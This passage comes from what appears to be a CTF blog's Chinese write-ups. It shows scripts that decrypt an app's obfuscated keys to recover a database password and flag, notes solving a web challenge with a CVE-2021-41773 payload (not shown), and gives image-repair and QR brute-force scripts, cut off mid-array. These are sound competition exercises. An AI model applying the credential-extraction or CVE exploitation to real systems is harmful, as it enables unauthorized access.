class="hljs-string">&quot;AES&quot;</span>);<br>        cipher.init(<span class="hljs-number">2</span>, secretKey);<br>        <span class="hljs-keyword">return</span> cipher.doFinal(plainText);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] OooO0O0(<span class="hljs-type">byte</span>[] data, <span class="hljs-type">byte</span>[] key) &#123;<br>        <span class="hljs-keyword">if</span> (data == <span class="hljs-literal">null</span> || data.length == <span class="hljs-number">0</span> || key == <span class="hljs-literal">null</span> || key.length == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> data;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; data.length; i++) &#123;<br>            result[i] = (<span class="hljs-type">byte</span>) ((data[i] ^ key[i % key.length]) ^ (i &amp; <span class="hljs-number">255</span>));<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>通过脚本得到密钥<code>Itahdrtbu^hr`hsk</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">b&#x27;xGP_UACWNcWO]WNP&#x27;</span><br>b=<span class="hljs-string">b&#x27;123456&#x27;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    e+=<span class="hljs-built_in">chr</span>(a[i]^b[i%<span class="hljs-built_in">len</span>(b)]^i)<br><br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<p>aes解密得到<code>OooO00o</code>函数的参数<code>2&gt;=9:92m;&lt;in=?3n</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/vec2-findme-2.png"></p>
<p>将<code>f1218OooO0O0</code>变量的所有成员与参数的每一位异或<code>FECanfOI()*&amp;&lt;MNCXZPKL</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>    <span class="hljs-type">Charset</span> <span class="hljs-variable">forName</span> <span class="hljs-operator">=</span> Charset.forName(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    OooO00o = forName;<br>    f1218OooO0O0 = <span class="hljs-string">&quot;FECanfOI()*&amp;&lt;MNCXZPKL&quot;</span>.getBytes(forName);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">OooO00o</span><span class="hljs-params">(String enc)</span> &#123;<br>    <span class="hljs-type">byte</span>[] b = enc.getBytes(OooO00o);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> b.length;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> keyBytes0 : f1218OooO0O0) &#123;<br>            b[i] = (<span class="hljs-type">byte</span>) (b[i] ^ keyBytes0);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>通过脚本解出数据库的密码<code>9562129f07be648e</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">key=<span class="hljs-string">b&quot;FECanfOI()*&amp;&lt;MNCXZPKL&quot;</span><br>data=<span class="hljs-string">&quot;2&gt;=9:92m;&lt;in=?3n&quot;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    c=i<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> key:<br>        c=c^j<br>    flag+=<span class="hljs-built_in">chr</span>(c)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<p>进入数据库后发现表<code>test</code>中有一条特别的数据（与其他数据长度不一样），<code>fee0b212f413f8a0</code></p>
<p>根据长度猜测flag是密码加最后一条数据</p>
<blockquote>
<p>flag{9562129f07be648efee0b212f413f8a0}</p>
</blockquote>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>vec</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯青少年杯初赛wp</title>
    <url>/%E7%AB%9E%E8%B5%9B/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E5%88%9D%E8%B5%9Bwp.html</url>
    <content><![CDATA[<h1 id="战队信息"><a href="#战队信息" class="headerlink" title="战队信息"></a>战队信息</h1><p>战队名称：Rml<br>战队排名：5</p>
<h1 id="解题情况"><a href="#解题情况" class="headerlink" title="解题情况"></a>解题情况</h1><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn.png"></p>
<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>CVE-2021-41773，payload直接打</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-web1-1.png"></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>base64解密后得到一张图片，但是每两个字节被换了位置</p>
<p>修复脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;a.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;b.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><br>data=f.read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data),<span class="hljs-number">2</span>):<br>    f1.write(data[i:i+<span class="hljs-number">2</span>][::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>

<p>得到hint<code>密钥就是音乐的财富密码</code>，加上题目描述<code>你知道万能和弦是什么吗?</code>，得到<code>4536251</code></p>
<p>lsb解密得到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-misc1-1.png"></p>
<h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p><em>赛后复现</em></p>
<p>祥云杯<code>shuffle_code</code>的后半部分</p>
<p>按行打乱了<br>网上的爆破脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">data = [[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span 